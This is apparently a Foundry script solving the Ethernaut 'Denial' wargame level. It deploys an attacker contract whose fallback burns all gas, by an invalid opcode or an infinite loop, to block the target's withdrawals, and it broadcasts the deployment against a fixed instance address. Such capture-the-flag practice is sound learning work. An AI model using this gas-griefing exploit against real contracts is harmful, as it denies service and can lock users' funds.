
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Denial.sol";


// Contract Solution
contract DenialAttack {
    constructor(Denial denial) {
        denial.setWithdrawPartner(address(this));
        denial.withdraw();
    }

    fallback() external payable{
        // Solution 1: invalid will consume all gas and not run the next line
        assembly {
            invalid()
        }
        // Solution 2: Forever while loop will consume all gas and not run the next line
        while (true) {}
    }
}

contract DenialSolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new DenialAttack(Denial(payable(0x6Ed77377448d204Cb3d2608780FB6268c63128FB)));
        vm.stopBroadcast();
    }
}